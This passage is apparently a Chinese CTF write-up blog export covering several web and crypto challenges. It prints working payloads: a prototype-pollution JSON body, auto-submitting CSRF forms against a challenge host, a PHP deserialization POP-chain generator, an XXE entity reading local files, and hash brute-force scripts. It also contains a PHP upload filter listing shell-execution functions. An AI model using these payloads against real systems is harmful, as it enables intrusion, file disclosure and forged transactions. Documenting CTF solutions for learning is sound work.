hex_payload(payload)</span><br></pre></td></tr></table></figure><p><img src="image-20221128153421047.png" alt="image-20221128153421047"></p><p>因为这个函数 没写在disable_functions里 </p><p><img src="image-20221128153604977.png" alt="image-20221128153604977"></p><p><img src="image-20221128153556097.png" alt="image-20221128153556097"></p><p>能够读取文件后使用DirectoryIterator类来寻找flag在哪</p><p>星号被过滤了</p><p><img src="image-20221128154420020.png" alt="image-20221128154420020"></p><p><img src="image-20221128154425705.png" alt="r"></p><p>然后读一下  flag就行了  </p><p>也是拿到了源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">这前端不美si你！！！</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;upload_file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function waf($var): bool&#123;</span><br><span class="line">    $blacklist = [&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;`&quot;,&quot;chmod&quot;];</span><br><span class="line"></span><br><span class="line">    foreach($blacklist as $blackword)&#123;</span><br><span class="line">        if(stristr($var, $blackword)) return True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(0);</span><br><span class="line">//设置上传目录</span><br><span class="line">define(&quot;UPLOAD_PATH&quot;, &quot;./uploads&quot;);</span><br><span class="line">$msg = &quot;Upload Success!&quot;;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">$ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">if(!preg_match(&quot;/php/i&quot;, strtolower($ext)))&#123;</span><br><span class="line">die(&quot;俺不要图片,熊大&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = file_get_contents($temp_file);</span><br><span class="line">if(waf($content))&#123;</span><br><span class="line">    die(&quot;哎呦你干嘛，小黑子...&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$new_file_name = md5($file_name).&quot;.&quot;.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;Upload Failed!&#x27;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        echo $msg.&quot;  &quot;.$img_path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h1><p>开局登陆 </p><p>F12</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--This secret is 7 characters long for security!</span><br><span class="line">hash=md5(secret+&quot;flag&quot;);//1946714cfa9deb70cc40bab32872f98a</span><br><span class="line">admin cookie is   md5(secret+urldecode(&quot;flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog&quot;));</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>登陆失败的js</p><p><img src="image-20221128161208593.png" alt="image-20221128161208593"></p><p>出来就是要大写的ADMIN</p><p>爆破出来secret是abcdefg  结果并不对 </p><p>其实是   哈希拓展长度攻击</p><p>顺道装一下hashpump</p><p><img src="image-20221128164713399.png" alt="image-20221128164713399"></p><p>然后登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index HTTP/1.1</span><br><span class="line">Host: 47.108.29.107:23333</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line">Origin: http://47.108.29.107:23333</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://47.108.29.107:23333/</span><br><span class="line">Cookie: hash=ed63246fb602056fee4a7ec886d0a3c2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pwd=123&amp;userid=Admin</span><br></pre></td></tr></table></figure><p><img src="image-20221128164851391.png" alt="image-20221128164851391"></p><p>在访问 /infof11111ag</p><p><img src="image-20221128164948778.png" alt="image-20221128164948778"></p><p>，离谱 题目环境炸了 </p><p>正常应该得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj = &gt;obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) = &gt;&#123;</span><br><span class="line">    for (var attr in b) &#123;</span><br><span class="line">        if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const clone = (a) = &gt;&#123;</span><br><span class="line">    return merge(&#123;&#125;,</span><br><span class="line">    a);</span><br><span class="line">&#125;</span><br><span class="line">router.get(&#x27;/&#x27;,</span><br><span class="line">function(req, res, next) &#123;</span><br><span class="line">    if (req.flag == &quot;flag&quot;) &#123;</span><br><span class="line">        flag;</span><br><span class="line">        res.send(&#x27;flag?????????????&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.render(&#x27;info&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&#x27;/&#x27;, express.json(),</span><br><span class="line">function(req, res) &#123;</span><br><span class="line">    var str = req.body.id;</span><br><span class="line">    var obj = JSON.parse(str);</span><br><span class="line">    req.cookies.id = clone(obj);</span><br><span class="line">    res.render(&#x27;info&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure><p>然后去原型链污染</p><p>merge的原型链污染 直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#123;&quot;aaa&quot;:1,&quot;__proto__&quot;:&#123;&quot;flag&quot;:&quot;flag&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="ezjaba"><a href="#ezjaba" class="headerlink" title="ezjaba"></a>ezjaba</h1><p>挖个坑</p><p><img src="image-20221128165649818.png" alt="image-20221128165649818"></p><h1 id="Cry1"><a href="#Cry1" class="headerlink" title="Cry1"></a>Cry1</h1><p>俩版本的脚本</p><p>就是爆破加盐sha256</p><p>golang</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">   &quot;crypto/sha256&quot;</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;time&quot;</span><br><span class="line">)</span><br><span class="line">var (</span><br><span class="line">   chars  = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; + &quot;abcdefghijklmnopqrstuvwxyz&quot; + &quot;0123456789&quot; // A-Z a-z 0-9</span><br><span class="line">   tail   = &quot;fuWhjDPmS79bNGOS&quot;                                                         // 原字符串的尾部</span><br><span class="line">   result = &quot;e9015208236cb20c50d1d04fe11c9cf55dd8365d9410194c283c5100e3bf82d8&quot;         // hash值</span><br><span class="line">)</span><br><span class="line">func sha(head string) &#123;</span><br><span class="line">   h := sha256.New()</span><br><span class="line">   h.Write([]byte(head + tail))</span><br><span class="line">   str := fmt.Sprintf(&quot;%x&quot;, h.Sum(nil))</span><br><span class="line">   if str == result &#123;</span><br><span class="line">      fmt.Println(head)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">   start := time.Now()</span><br><span class="line">   for _, ch1 := range chars &#123;</span><br><span class="line">      for _, ch2 := range chars &#123;</span><br><span class="line">         for _, ch3 := range chars &#123;</span><br><span class="line">            for _, ch4 := range chars &#123;</span><br><span class="line">               sha(string(ch1) + string(ch2) + string(ch3) + string(ch4))</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   end := time.Since(start)</span><br><span class="line">   fmt.Println(end)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    hash = hashlib.sha256();</span><br><span class="line">    a = random.sample(string.ascii_letters + string.digits, 4)</span><br><span class="line">    b = (&#x27;&#x27;.join(a))</span><br><span class="line">    hash.update(bytes(b + &#x27;4fYrLZMD6QfZUvIV&#x27;, encoding=&#x27;utf-8&#x27;))</span><br><span class="line">    c=hash.hexdigest()</span><br><span class="line">    if c == &#x27;d1e2eff5e4d55c4323c380dfa3eaff8708d84f793098829a90be1f9523ddeeab&#x27; :</span><br><span class="line">        print(b)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>附上密码✌wp</p><p>有空研究 ;</p><blockquote><p><a href="https://www.cnblogs.com/ZimaBlue/articles/16932217.html">https://www.cnblogs.com/ZimaBlue/articles/16932217.html</a></p></blockquote><h1 id="GumpKing"><a href="#GumpKing" class="headerlink" title="GumpKing"></a>GumpKing</h1><p>这也叫misc?</p><p>ce改分  </p><p><img src="640.png" alt="图片"></p><p><img src="640-16696257906826.png" alt="图片"></p><p>反思：</p><p>babyphp 在已知做法、payload全通  的情况下犯病 主要问题1.session反序列化练习少2.内置类用的不多</p><p>eazyupload 需要补课  字符串转义</p><p>ezjs 需要补课 hash拓展攻击 nodejs原型链污染</p><p>ezjaba 待补充 </p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekChallenge2022</title>
      <link href="/2022/11/26/GeekChallenge2022/"/>
      <url>/2022/11/26/GeekChallenge2022/</url>
      
        <content type="html"><![CDATA[<h1 id="登陆试试"><a href="#登陆试试" class="headerlink" title="登陆试试"></a>登陆试试</h1><p>爆破</p><h1 id="来发个包"><a href="#来发个包" class="headerlink" title="来发个包"></a>来发个包</h1><p><img src="image-20221121183616745.png" alt="image-20221121183616745"></p><p>发个包就行</p><span id="more"></span><h1 id="Can-Can-Need"><a href="#Can-Can-Need" class="headerlink" title="Can Can Need"></a>Can Can Need</h1><p>套娃改请求头</p><h1 id="L0veSyc"><a href="#L0veSyc" class="headerlink" title="L0veSyc"></a>L0veSyc</h1><p>F12</p><h1 id="justphp"><a href="#justphp" class="headerlink" title="justphp"></a>justphp</h1><p>进制绕过</p><h1 id="jsfind"><a href="#jsfind" class="headerlink" title="jsfind"></a>jsfind</h1><p>看源码</p><h1 id="ezR-F-I"><a href="#ezR-F-I" class="headerlink" title="ezR_F_I"></a>ezR_F_I</h1><p>%23截断</p><h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p>很简单</p><h1 id="WelcomeSQL"><a href="#WelcomeSQL" class="headerlink" title="WelcomeSQL"></a>WelcomeSQL</h1><p>一把梭</p><h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><p>一把梭</p><h1 id="drinktea"><a href="#drinktea" class="headerlink" title="drinktea"></a>drinktea</h1><p>csrf伪造购买 </p><p>csrf伪造 创建vip</p><p>破解伪随机验证码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=http://mc.vveelin.com.cn:8102/trans.php method=POST&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;abc&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;money&quot; value=&quot;999999999999999999999&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!--2bfd7154e1f327a42dae866bac9ecd45--&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=http://mc.vveelin.com.cn:8102/mng.php method=GET&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;abc&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;vip&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!--2bfd7154e1f327a42dae866bac9ecd45--&gt;</span><br></pre></td></tr></table></figure><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>.swp文件是 源码奇特的加密方式 改eval为echo出源码</p><p>pop链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#__destruct()</span><br><span class="line">class BillyHerrington</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;Baoglady&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">#__tostring()</span><br><span class="line">class Baoglady&#123;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line">&#125;</span><br><span class="line">#(eval)</span><br><span class="line">class VanDarkholme&#123;</span><br><span class="line">    public $d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Baoglady();</span><br><span class="line">$b = new BillyHerrington();</span><br><span class="line">$c = new VanDarkholme();</span><br><span class="line"></span><br><span class="line">$b-&gt;a = $a;</span><br><span class="line">$a -&gt;b =$c;</span><br><span class="line">$a -&gt;c =&quot;phpinfo();&quot;;</span><br><span class="line"></span><br><span class="line">$f=(serialize($b));</span><br><span class="line">echo $f;</span><br><span class="line">echo &quot; \n&quot;;</span><br><span class="line">$f1=str_replace(&#x27;:&quot;BillyHerrington&quot;:1:&#123;&#x27;,&#x27;:&quot;BillyHerrington&quot;:2:&#123;&#x27;,$f);</span><br><span class="line">echo $f1;</span><br><span class="line">echo &quot; \n&quot;;</span><br><span class="line">echo urlencode($f1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#O:15:&quot;BillyHerrington&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h1><p>爆破token密码  然后得到xml文件</p><p>没思路了</p><p><img src="image-20221125182423181.png" alt="image-20221125182423181"></p><p>应该是 <code>XXE注入</code></p><p>用yakit抓包一下修改请求头</p><p>改为<code>POST</code>传参</p><p>加上 <code>content-type:application/xml</code></p><p>然后添上post内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;</span><br><span class="line">&lt;firstname&gt;Syclover&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;Good!!!&lt;/lastname&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20221125182414496.png" alt="image-20221125182414496"></p><p>页面回显 <code>Received firstname: Syclover, lastname: Good!!!</code></p><p>注入点就在这了</p><p>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;firstname&gt; &amp;xxe;&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;Good!!!&lt;/lastname&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>post传参拿到flag <code>SYc&#123;1_l0v3_th3_syc_fam1ly&#125;</code></p><p><img src="image-20221125182342219.png" alt="image-20221125182342219"></p><h1 id="Not-Stay"><a href="#Not-Stay" class="headerlink" title="Not_Stay"></a>Not_Stay</h1><p>伪协议+file_put_contents</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">include_once(&#x27;waf.php&#x27;);</span><br><span class="line">function  uuid()  </span><br><span class="line">&#123;  </span><br><span class="line">    $chars = md5(uniqid(mt_rand(), true));  </span><br><span class="line">    $uuid = substr ( $chars, 0, 8 ) . &#x27;-&#x27;</span><br><span class="line">            . substr ( $chars, 8, 4 ) . &#x27;-&#x27; </span><br><span class="line">            . substr ( $chars, 12, 4 ) . &#x27;-&#x27;</span><br><span class="line">            . substr ( $chars, 16, 4 ) . &#x27;-&#x27;</span><br><span class="line">            . substr ( $chars, 20, 12 );  </span><br><span class="line">    return $uuid ;  </span><br><span class="line">&#125;  </span><br><span class="line">$safe_header = &#x27;&lt;?php exit();?&gt;&#x27;;</span><br><span class="line">if(!isset($_COOKIE[&#x27;path&#x27;]))&#123;</span><br><span class="line">    setcookie(&#x27;path&#x27;,uuid());</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$path = &#x27;./upload/&#x27;.$_COOKIE[&#x27;path&#x27;].&#x27;/&#x27;;</span><br><span class="line">if(!is_dir($path))&#123;</span><br><span class="line">    mkdir($path);</span><br><span class="line">    chmod($path,0755);</span><br><span class="line">&#125;</span><br><span class="line">$file_data = $_POST[&#x27;data&#x27;];</span><br><span class="line">$filename = $_POST[&#x27;filename&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;data&#x27;]))&#123;</span><br><span class="line">    file_put_contents(&#x27;/tmp/&#x27;.$_COOKIE[&#x27;path&#x27;],$file_data);</span><br><span class="line">    $file_type = exif_imagetype(&#x27;/tmp/&#x27;.$_COOKIE[&#x27;path&#x27;]);</span><br><span class="line">    if($file_type != &quot;GIF&quot; &amp;&amp; $file_type != &quot;PNG&quot;)&#123;</span><br><span class="line">        die(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;I need data&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    file_put_contents($filename,$safe_header.$file_data);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;I need name&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="ezrequset"><a href="#ezrequset" class="headerlink" title="ezrequset"></a>ezrequset</h1><p><img src="image-20221120184248234.png" alt="image-20221120184248234"></p><p>和算钱的一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># http://r7fde6cd-68bb-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=index  post  xh=1</span><br><span class="line"></span><br><span class="line"># http://r7fde6cd-68bb-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=check  num=8   &amp;class=</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def cut_out(a, b, string):</span><br><span class="line">    result = re.findall(&quot;.*%s(.*)%s.*&quot; % (a, b), string)</span><br><span class="line"></span><br><span class="line">    for x in result:</span><br><span class="line">        return x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url1 = &#x27;http://r7fde6cd-68bb-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=index&#x27;</span><br><span class="line">url2 = &#x27;http://r7fde6cd-68bb-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=check&#x27;</span><br><span class="line">data1 = &#123;&#x27;xh&#x27;: &#x27;a&#x27;&#125;</span><br><span class="line">r = s.post(url1, data=data1)</span><br><span class="line"></span><br><span class="line">a = &#x27;摸鱼:&#x27;</span><br><span class="line">b = &#x27;号&#x27;</span><br><span class="line">Num = cut_out(a, b, r.text)</span><br><span class="line"></span><br><span class="line">c = &#x27;号&#x27;</span><br><span class="line">d = &#x27;&lt;!DOC&#x27;</span><br><span class="line">Class = cut_out(c, d, r.text)</span><br><span class="line">data2 = &#123;&#x27;num&#x27;: Num, &#x27;class&#x27;: Class</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = s.post(url2, data=data2)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line">cookie =s.cookies</span><br><span class="line">print(cookie)</span><br></pre></td></tr></table></figure><h1 id="uploadrce"><a href="#uploadrce" class="headerlink" title="uploadrce"></a>uploadrce</h1><p>怎么geek也出原题啊</p><p>就是 P牛的姿势 在修改配置文件时的洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&#x27;option&#x27;])) die();</span><br><span class="line">$str = 